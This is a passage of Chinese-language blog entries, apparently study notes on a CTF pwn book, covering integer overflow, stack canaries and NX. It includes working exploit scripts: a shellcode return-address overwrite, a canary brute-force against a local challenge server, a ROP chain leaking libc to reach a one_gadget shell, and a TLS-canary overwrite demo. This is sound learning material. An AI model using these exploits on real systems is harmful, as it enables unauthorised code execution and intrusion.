class="keyword">const</span> <span class="keyword">char</span> * src, <span class="keyword">size_t</span> n)</span></span>;</span><br></pre></td></tr></table></figure><p>假设输入的n足够大，可能发生回绕，或者当n输入为负数的时候，这个地方可能把它解析为非常大的正数，导致溢出</p><h2 id="整数溢出示例"><a href="#整数溢出示例" class="headerlink" title="整数溢出示例"></a>整数溢出示例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check</span><span class="params">(<span class="keyword">char</span> * passwd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> passwd_buf[<span class="number">11</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> passwd_len = <span class="built_in">strlen</span>(passwd);</span><br><span class="line">    <span class="keyword">if</span>(passwd_len &gt;= <span class="number">4</span> &amp;&amp; passwd_len &lt;= <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;good!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">strcpy</span>(passwd_buf, passwd);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bad!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    check(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将所有保护都关掉进行测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">image_addr = <span class="number">0x8048000</span></span><br><span class="line">libc_addr = <span class="number">0xf7ddc000</span></span><br><span class="line"></span><br><span class="line">jmp_esp_addr = <span class="number">0x00002b59</span> + libc_addr<span class="comment"># jmp esp的地址</span></span><br><span class="line">shellcode = shellcraft.i386.linux.sh()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">24</span> + p32(jmp_esp_addr) + asm(shellcode)<span class="comment"># gdb调试用pattern测得eip偏移是24个字节</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">payload = payload.ljust(<span class="number">261</span>, <span class="string">b&#x27;\x01&#x27;</span>)<span class="comment"># 不能是\x00，会被strlen截断</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">p = process(argv=[<span class="string">&#x27;./main&#x27;</span>, payload])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 读书笔记 </tag>
            
            <tag> 《CTF竞赛权威指南-pwn篇》 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第4章_Linux安全机制</title>
      <link href="/2022/03/22/%E7%AC%AC4%E7%AB%A0_Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/"/>
      <url>/2022/03/22/%E7%AC%AC4%E7%AB%A0_Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="Stack-Canaries"><a href="#Stack-Canaries" class="headerlink" title="Stack Canaries"></a>Stack Canaries</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Stack Canaries 是一种对抗栈溢出攻击的技术，即SSP安全机制，有时也叫Stack cookies， 他是一个随机数，保存在栈上，比函数返回地址更低的位置，因为要想覆盖到返回地址，必然先覆盖到Canary，所以在函数返回前检查Canary是否变化，就可以达到保护栈的目的。</p><p>写程序测试</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fstack-protector main.c -o main</span><br></pre></td></tr></table></figure><p>运行，输入过长的字符，发现程序抛出异常stack smashing detected，表示检测到了栈溢出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">╭─ ~/Desktop/testC                                                           ✔ </span><br><span class="line">╰─ ./main </span><br><span class="line">1111111111111111111111111111</span><br><span class="line">*** stack smashing detected ***: &lt;unknown&gt; terminated</span><br><span class="line">[1]    29048 abort (core dumped)  ./main</span><br></pre></td></tr></table></figure><p>反汇编看一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">gef➤  disassemble main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00000000000006da &lt;+0&gt;:push   rbp</span><br><span class="line">   0x00000000000006db &lt;+1&gt;:mov    rbp,rsp</span><br><span class="line">   0x00000000000006de &lt;+4&gt;:sub    rsp,0x20</span><br><span class="line">   0x00000000000006e2 &lt;+8&gt;:mov    rax,QWORD PTR fs:0x28################</span><br><span class="line">   0x00000000000006eb &lt;+17&gt;:mov    QWORD PTR [rbp-0x8],rax ################</span><br><span class="line">   0x00000000000006ef &lt;+21&gt;:xor    eax,eax</span><br><span class="line">   0x00000000000006f1 &lt;+23&gt;:lea    rax,[rbp-0x12]</span><br><span class="line">   0x00000000000006f5 &lt;+27&gt;:mov    rsi,rax</span><br><span class="line">   0x00000000000006f8 &lt;+30&gt;:lea    rdi,[rip+0xb5]        # 0x7b4</span><br><span class="line">   0x00000000000006ff &lt;+37&gt;:mov    eax,0x0</span><br><span class="line">   0x0000000000000704 &lt;+42&gt;:call   0x5b0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x0000000000000709 &lt;+47&gt;:mov    eax,0x0</span><br><span class="line">   0x000000000000070e &lt;+52&gt;:mov    rdx,QWORD PTR [rbp-0x8]################</span><br><span class="line">   0x0000000000000712 &lt;+56&gt;:xor    rdx,QWORD PTR fs:0x28################</span><br><span class="line">   0x000000000000071b &lt;+65&gt;:je     0x722 &lt;main+72&gt;################</span><br><span class="line">   0x000000000000071d &lt;+67&gt;:call   0x5a0 &lt;__stack_chk_fail@plt&gt;################</span><br><span class="line">   0x0000000000000722 &lt;+72&gt;:leave  </span><br><span class="line">   0x0000000000000723 &lt;+73&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>在Linux中，fs寄存器用来存TLS，而如果是64位程序，TLS字段偏移0x28的位置存放着stack_guard,程序先把他放到栈中，等函数运行完，在拿出fs:0x28和存放到栈中的那个stack_guard对比，如果不一样就会stack_chk_fail</p><p>攻击canaries主要有2中套路</p><ol><li>将Canaries的值泄露出来</li><li>同时修改TLS和栈上的Canaries</li></ol><h3 id="泄露Canaries"><a href="#泄露Canaries" class="headerlink" title="泄露Canaries"></a>泄露Canaries</h3><p>这里以NJCTF2017_messager题目为例</p><p>IDA打开分析，发现在函数400BE9中recv存在栈溢出漏洞，而400BC6的位置是将flag发送到客户端，所以我们的目的就是将返回地址覆盖为0x400BC6即可</p><img src="/2022/03/22/%E7%AC%AC4%E7%AB%A0_Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20220316101058877.png" class="" title="image-20220316101058877"><img src="/2022/03/22/%E7%AC%AC4%E7%AB%A0_Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20220316101139703.png" class="" title="image-20220316101139703"><p>重启服务器，canary就会变化，但是</p><img src="/2022/03/22/%E7%AC%AC4%E7%AB%A0_Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20220316101333764.png" class="" title="image-20220316101333764"><p>这里采用的是，每连接一个客户端，就fork一个子程序，而子程序和服务器的canary是一样的，如果服务器不重启，fork的子程序的canary就不会变，所以可以采用爆破的方式</p><p>写EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_canary</span>():</span></span><br><span class="line">    <span class="keyword">global</span> canary</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(canary) &lt; <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">5555</span>)</span><br><span class="line">            io.recv()       <span class="comment"># Welcome!</span></span><br><span class="line">            payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">104</span> + canary + long_to_bytes(x)</span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            io.send(payload)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                io.recv()</span><br><span class="line">                canary = canary + long_to_bytes(x)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                io.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;canary is <span class="subst">&#123;canary&#125;</span>&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">5555</span>)</span><br><span class="line">    io.recv()       <span class="comment"># Welcome!</span></span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">104</span> + canary + <span class="string">b&#x27;A&#x27;</span> *<span class="number">8</span> + p64(<span class="number">0x400BC6</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    <span class="built_in">print</span>(io.recv())</span><br><span class="line"></span><br><span class="line">leak_canary()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure><p>在本地建个flag, 运行messager做一下测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to 127.0.0.1 on port 5555: Done</span><br><span class="line">[*] Closed connection to 127.0.0.1 port 5555</span><br><span class="line">[+] Opening connection to 127.0.0.1 on port 5555: Done</span><br><span class="line">[*] Closed connection to 127.0.0.1 port 5555</span><br><span class="line">[+] Opening connection to 127.0.0.1 on port 5555: Done</span><br><span class="line">[*] Closed connection to 127.0.0.1 port 5555</span><br><span class="line">canary is b<span class="string">&#x27;\x00&#125;\xd90(\x8b\xd6\x00&#x27;</span></span><br><span class="line">[+] Opening connection to 127.0.0.1 on port 5555: Done</span><br><span class="line">b<span class="string">&#x27;flag&#123;niubiniubi&#125;\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line">[*] Closed connection to 127.0.0.1 port 5555</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://e3pem.github.io/2018/09/30/NJCTF2017/%E9%A2%98%E7%9B%AE%E5%8E%9F%E4%BB%B6%E5%8F%AF%E4%BB%A5%E4%BB%8E%E8%BF%99%E9%87%8C%E4%B8%8B%E8%BD%BD">https://e3pem.github.io/2018/09/30/NJCTF2017/题目原件可以从这里下载</a></p></blockquote><h3 id="覆盖TLS的canary"><a href="#覆盖TLS的canary" class="headerlink" title="覆盖TLS的canary"></a>覆盖TLS的canary</h3><p>在pthread_create创建的线程中,glibc就是在栈的高地址对TLS进行初始化，所以溢出足够多的数据就可以篡改tls中的那个canary</p><blockquote><p><a href="https://dere.press/2020/10/18/glibc-tls/#fei-zhu-xian-cheng-qing-xing">https://dere.press/2020/10/18/glibc-tls/#fei-zhu-xian-cheng-qing-xing</a>  这篇博客tls讲的很清楚</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pwn_payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *argv[<span class="number">2</span>] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">execve</span>(argv[<span class="number">0</span>], argv, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fixup = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> * <span class="title">first</span><span class="params">(<span class="keyword">void</span> *x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *addr;</span><br><span class="line">    <span class="built_in">arch_prctl</span>(ARCH_GET_FS, &amp;addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;thread FS %p\n&quot;</span>, addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cookie thread: 0x%lx\n&quot;</span>, addr[<span class="number">5</span>]);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> * frame = __builtin_frame_address(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stack_cookie addr %p \n&quot;</span>, &amp;frame[<span class="number">-1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;diff : %lx\n&quot;</span>, (<span class="keyword">char</span>*)addr - (<span class="keyword">char</span>*)&amp;frame[<span class="number">-1</span>]); </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> len =(<span class="keyword">unsigned</span> <span class="keyword">long</span>)( (<span class="keyword">char</span>*)addr - (<span class="keyword">char</span>*)&amp;frame[<span class="number">-1</span>]) + </span><br><span class="line">fixup;</span><br><span class="line">    <span class="comment">// example of exploitation</span></span><br><span class="line">    <span class="comment">// prepare exploit</span></span><br><span class="line">    <span class="keyword">void</span> *exploit = <span class="built_in">malloc</span>(len);</span><br><span class="line">    <span class="built_in">memset</span>(exploit, <span class="number">0x41</span>, len);</span><br><span class="line">    <span class="keyword">void</span> *ptr = &amp;pwn_payload;</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">char</span>*)exploit + <span class="number">16</span>, &amp;ptr, <span class="number">8</span>);</span><br><span class="line">    <span class="comment">// exact stack-buffer overflow example</span></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;frame[<span class="number">-1</span>], exploit, len);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> one;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *addr;</span><br><span class="line">    <span class="keyword">void</span> *val;</span><br><span class="line">    <span class="built_in">arch_prctl</span>(ARCH_GET_FS, &amp;addr);</span><br><span class="line">    <span class="keyword">if</span> (argc &gt; <span class="number">1</span>)</span><br><span class="line">        fixup = <span class="number">0x30</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main FS %p\n&quot;</span>, addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cookie main: 0x%lx\n&quot;</span>, addr[<span class="number">5</span>]);</span><br><span class="line">    <span class="built_in">pthread_create</span>(&amp;one, <span class="literal">NULL</span>, &amp;first, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">pthread_join</span>(one,&amp;val);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是书上的一个例子，编译这个例子就可以看到偏移</p><img src="/2022/03/22/%E7%AC%AC4%E7%AB%A0_Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20220317112839215.png" class="" title="image-20220317112839215"><p>IDA打开分析程序，可以发现存在栈溢出漏洞</p><img src="/2022/03/22/%E7%AC%AC4%E7%AB%A0_Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20220317113104775.png" class="" title="image-20220317113104775"><img src="/2022/03/22/%E7%AC%AC4%E7%AB%A0_Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20220317113153658.png" class="" title="image-20220317113153658"><p>checksec发现没有开PIE，但是开了NX，所以无法在栈中写代码了</p><p>思路就是利用ROP，执行puts，泄露出libc的地址，然后利用read，将one_gadget的地址写入进去，最后利用leave_ret调到one_gadget的地址去，getshell，在覆盖的时候要覆盖掉足够多的数据，将TLS的canary覆盖为和栈中的canary一样即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0400b73</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0400b71</span></span><br><span class="line">leave_ret = <span class="number">0x004008a6</span></span><br><span class="line">bss_addr = <span class="number">0x0602010</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">bs = ELF(<span class="string">&quot;./bs&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./bs&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span> * <span class="number">0x1008</span></span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">8</span>     <span class="comment"># canary</span></span><br><span class="line">payload += p64(bss_addr - <span class="number">8</span>)    <span class="comment"># Because pop rbp; ret; bss_addr is rbp</span></span><br><span class="line">payload += p64(pop_rdi) + p64(bs.got[<span class="string">&#x27;puts&#x27;</span>])    <span class="comment"># rdi = bs.got[&#x27;puts&#x27;]</span></span><br><span class="line">payload += p64(bs.plt[<span class="string">&#x27;puts&#x27;</span>])                   <span class="comment"># puts(bs.got[&#x27;puts&#x27;])  # print puts addr</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0</span>)            <span class="comment"># rdi = 0</span></span><br><span class="line">payload += p64(pop_rsi_r15) + p64(bss_addr) + p64(<span class="number">0</span>)        <span class="comment"># rsi = bss_addr, r15 = 0</span></span><br><span class="line">payload += p64(bs.plt[<span class="string">&#x27;read&#x27;</span>])                   <span class="comment"># read(0, bss_addr, ?)</span></span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;send?\n&quot;</span>, <span class="built_in">str</span>(<span class="number">0x2000</span>))</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;goodbye.\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addr_puts = io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;addr_puts: %#X&quot;</span> % u64(addr_puts))</span><br><span class="line">libc_baseaddr = u64(addr_puts) - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_baseaddr: %#X&quot;</span> % libc_baseaddr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one_gadget_addr = libc_baseaddr + <span class="number">0x4f302</span></span><br><span class="line">io.send(p64(one_gadget_addr))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="No-eXecute"><a href="#No-eXecute" class="headerlink" title="No-eXecute"></a>No-eXecute</h2><p>No-eXecute表示不可执行，其原理就是将数据所在的内存页，比如堆栈，标识为不可执行，如果程序产生溢出转入执行shellcode的时候，CPU就会抛出异常</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln_func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    <span class="built_in">read</span>(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">vuln_func</span>();</span><br><span class="line">    <span class="built_in">write</span>(STDOUT_FILENO, <span class="string">&quot;Hello world!\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="未开启NX情况"><a href="#未开启NX情况" class="headerlink" title="未开启NX情况"></a>未开启NX情况</h3><p>根据书上的代码试验下，为了防止其他因素干扰，先关闭canary和ASLR, 然后创建一个没有开启NX的程序</p><p>用shellcode攻击下看看，payload 填充 +ret(jmp esp的地址) + shellcode 的形式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> ROPgadget --binary libc-2.27.so| grep <span class="string">&quot;jmp esp&quot;</span></span><br><span class="line"> <span class="comment"># 0x00189435 : adc bh, ch ; jmp esp </span></span><br><span class="line"> </span><br><span class="line"> .....<span class="comment"># 运行gdb</span></span><br><span class="line"> gef➤  x/10i 0xf7ddc000+0x189437</span><br><span class="line">   0xf7f65437:jmp    